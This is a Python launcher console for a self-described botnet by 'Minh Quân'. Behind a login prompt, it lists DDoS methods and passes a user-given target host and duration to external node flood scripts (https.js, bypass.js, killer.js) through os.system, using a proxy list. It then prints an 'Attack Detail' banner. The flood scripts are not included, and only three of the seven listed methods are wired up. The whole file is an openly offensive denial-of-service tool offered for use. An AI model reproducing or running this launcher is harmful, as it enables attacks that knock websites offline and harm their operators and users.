import socket
import os
import requests
import random
from colorama import Fore, Style, Back
from fake_headers import Headers
from pystyle import Colors, Colorate, Center
import getpass
import time
from time import sleep
import sys

###COPYRIGHT tool###
def si():
    print('')

###help###
def help():
    print("""\x1b[1;31m* \x1b[1;37mmethods\x1b[1;31m: \x1b[1;37mList methods attack for ghost
\x1b[1;31m* \x1b[1;37mclear  \x1b[1;31m: \x1b[1;37mBack to main on home""")
####Methods####
def meth():
    si()
    print(f"""\x1b[1;31m \x1b[1;37m.tls
\x1b[1;31m \x1b[1;37m.floodv1 
\x1b[1;31m \x1b[1;37m.floodv2
\x1b[1;31m \x1b[1;37m.https      
\x1b[1;31m \x1b[1;37m.bypass       
\x1b[1;31m \x1b[1;37m.killer    
\x1b[1;31m \x1b[1;37m.http-ddos
""")

def menu():
    sys.stdout.write(f"Botnet By Minh Quân")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    print(f"""
\x1b[38;2;8;140;255m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ⠀⠀⠀⢁⢄⠴⢕⣾⣎⣷⢄⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⣀⡠⠦⠊⡁⠣⠂⠀⠄⠙⣇⡑⠫⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⡀⠛⠈⠧⠀⢀⠀⠈⠀⠐⢀⠘⣦⠁⡆⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠄⡀⠀⠑⠂⣄⣶⡓⢀⠀⠀⠀⠀⠀⠀⠢⠀⠀⡀⠀⢾⢌⠢⡔
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡄⡖⠀⢥⠀⣉⠈⠑⠉⣒⠐⠁⢠⠀⠀⠂⠄⠀⡀⡀⠀⠀⠀⢀⡻⣈⡐⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⡺⠇⠍⠀⠀⠂⠁⠁⡠⠀⠀⠊⡀⠀⠀⠐⠐⠁⠁⣨⠈⠀⠠⣠⡄⠀⠀⡍⣤⡜⡂⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡢⣓⠛⠃⠠⠀⠂⢀⠀⠂⠀⠁⠐⠀⠀⠐⠐⢀⢀⠀⠀⠀⠠⠄⣈⠘⠘⠀⢈⡪⡹⢆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡅⠄⣧⠀⠀⠠⢁⠀⠐⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢡⠀⠀⠀⠀⠆⡠⠀⠀⢰⢞⡓⡵⠀⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⢗⣏⢇⠃⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠂⠀⠀⣂⠀⢸⢄⣵⠗⠧⣽⠄⠈⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠀⡄⡖⣍⡈⣎⠕⢀⠀⠀⠀⠀⡀⠄⠀⠀⠀⠀⠁⠀⠀⠄⠀⠊⡀⣀⠀⠢⡤⣨⣂⢜⣋⣕⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⣥⣏⡎⠁⡁⠟⢀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡃⢰⡰⠋⡱⠃⠀⡟⢅⣁⠀⠀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠓⡿⣗⡪⠂⢀⠑⣓⠂⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⡀⠀⠁⠠⣆⢋⣯⠑⢋⠀⠀⠂⡠⠀⠂⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠐⡏⢟⣇⣁⡑⢁⡠⠂⡍⠁⠀⠐⠀⠐⠀⠀⠀⠀⠀⣀⠀⠁⡀⣾⡷⢗⠔⣠⠄⠃⠀⡀⡈⠁⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠐⣳⣲⡪⠌⠔⡓⡄⠐⢀⡄⠀⠂⠀⠀⠀⠀⠀⠀⠂⡂⡜⣴⢳⢍⠁⢤⡀⠄⠀⠀⠀⠰⡟⢅⢐⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⢃⣝⡗⠯⣡⢦⢕⠇⠄⡁⣁⡄⠀⠀⠀⠀⡄⢊⡰⢠⠴⡹⠂⠀⡥⠀⠁⠀⢀⠀⠀⠀⢂⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢂⠈⠂⢆⠉⡍⡮⣓⡶⡛⠥⠂⢒⢐⢁⠀⡀⠨⡁⢄⣑⡺⠎⣁⠳⠱⡂⠀⠃⠠⠀⠀⠁⠈⠂⡟⢅⠁⠄⠂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢤⣦⠇⠀⠐⡀⠁⠎⠱⣁⢯⠿⣃⣋⠆⠏⠁⣀⣪⣎⣽⠎⡒⠀⠉⡀⠢⢀⠀⠀⢀⠀⢀⡀⠃⢀⠀⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⣹⣿⣟⠇⠀⠀⠁⡈⣅⠀⠙⡳⡂⡗⣇⣇⡘⣗⣋⢣⠳⡎⢡⡀⠀⠄⠀⠀⠀⠀⠂⠀⠀⠍⡟⢅⣁⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢈⣯⣟⣻⡅⠀⠀⠀⠈⠀⡡⢁⠌⠊⢫⣮⣚⢏⡯⡶⡟⡏⠑⢁⠃⡂⠀⡠⠜⠆⡀⣄⡔⠗⠂⡟⢅⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⣦⣿⣣⠓⠂⠄⡑⣀⣁⡄⢢⢢⡧⠑⡟⢫⢷⡋⠯⠵⢏⣩⡇⡥⣤⣠⡈⣠⣾⠖⣇⢊⢀⠡⡁⠢⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⠁⠨⣽⣿⣏⣍⡈⠭⠂⡃⡒⢘⡲⠋⡎⠖⢆⠐⠠⡈⢣⡨⡏⠍⠃⠈⠔⡊⢂⡰⡉⠊⠁⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠠⠐⣘⡛⡢⡬⡡⠡⡆⢚⣕⡟⢅⠒⠐⠀⠂⠂⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠀⡁⢸⢅⠃⢐⡈⡀⡨⠙⠁⠕⠂⠂⠑⠀⠈⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀""")
def main():
    menu()
    while(True):
        cnc = input(Fore.BLACK+Back.BLUE+"root@admin➤"+Style.RESET_ALL)
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        
        elif "https" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                os.system('cls' if os.name == 'nt' else 'clear')
                os.system(f"node https.js {host} {time} 64 10 proxy.txt")
                print(f"""
\x1b[38;2;8;140;255m
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠤⠤⠤⠤
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀ ⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀ ⠀⠀⠀⠿

--> [ Attack Detail ] <--


-> Host - {host} 
-> Port - [ 443 ]
-> Time - [ {time} ] 
-> Methods - [ HTTPS ]
-> By - [ Minh Quân ]""")
            except IndexError:
                print("Usage : https <host> <time>")
                print("Example : https https://example.com 60")
        elif "bypass" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                os.system('cls' if os.name == 'nt' else 'clear')
                os.system(f"node bypass.js {host} {time} 64 10 proxy.txt")
                print(f"""
\x1b[38;2;8;140;255m
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠤⠤⠤⠤
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀ ⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀ ⠀⠀⠀⠿

--> [ Attack Detail ] <--


-> Host - {host} 
-> Port - [ 443 ]
-> Time - [ {time} ] 
-> Methods - [ BYPASS ]
-> By - [ Minh Quân ]""")
            except IndexError:
                print("Usage : bypass <host> <time>")
                print("Example : bypass https://example.com 60")
        elif "killer" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                os.system('cls' if os.name == 'nt' else 'clear')
                os.system(f"node killer.js {host} {time} 64 10 proxy.txt")
                print(f"""
\x1b[38;2;8;140;255m
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠤⠤⠤⠤
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀ ⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀ ⠀⠀⠀⠿

--> [ Attack Detail ] <--


-> Host - {host} 
-> Port - [ 443 ]
-> Time - [ {time} ] 
-> Methods - [ KILLER ]
-> By - [ Minh Quân ]""")
                print("Usage : killer <host> <time>")
                print("Example : killer https://example.com 60")

            
def login():
    user = ""
    passwd = ""
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Thank you")
        time.sleep(1)
        
        main()

login()